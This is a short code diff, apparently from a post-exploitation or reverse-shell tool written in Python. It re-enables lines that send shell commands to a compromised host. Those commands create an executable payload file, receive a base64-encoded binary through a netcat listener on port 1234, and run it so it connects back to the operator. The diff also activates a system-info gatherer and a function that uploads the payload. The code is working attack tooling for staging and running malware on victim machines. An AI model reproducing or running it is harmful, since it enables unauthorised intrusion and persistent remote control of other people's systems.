@@ -156,7 +156,7 @@ class LocalShell(cmd.Cmd):
 
         sock = listen(host, port, 0)
         sock.sysinfo = SystemInfoGatherer()
-        # sock.sysinfo.binaryGatherer(sock)
+        sock.sysinfo.binaryGatherer(sock)
 
         if not sock: 
             return
@@ -165,13 +165,13 @@ class LocalShell(cmd.Cmd):
         # sock.sysinfo.is_nc = self.sock.send_command("which nc") # This doesnt work
         if sock.sysinfo.is_nc:
             logging.info(f"Sending payload..")
-            # sock.client_socket.send(b"touch payload\n")
-            # sock.client_socket.send(b"chmod +x payload\n")
-            # sock.client_socket.send(f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload && sleep 5 && ./payload {host} {port}'\n".encode())
+            sock.client_socket.send(b"touch payload\n")
+            sock.client_socket.send(b"chmod +x payload\n")
+            sock.client_socket.send(f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload && sleep 5 && ./payload {host} {port}'\n".encode())
             # TODO: add a check that confirms that netcat is running if not just skip 
             sock.server_socket.close()
             sock.client_socket.close()
-            # send_file(os.path.join(PROJ_DIR, "payload/payload"), host, 1234)
+            send_file(os.path.join(PROJ_DIR, "payload"), host, 1234)
             logging.info(f"Payload sent. Starting listener..")
             sock = listen(host, port, 1)
             if not sock:
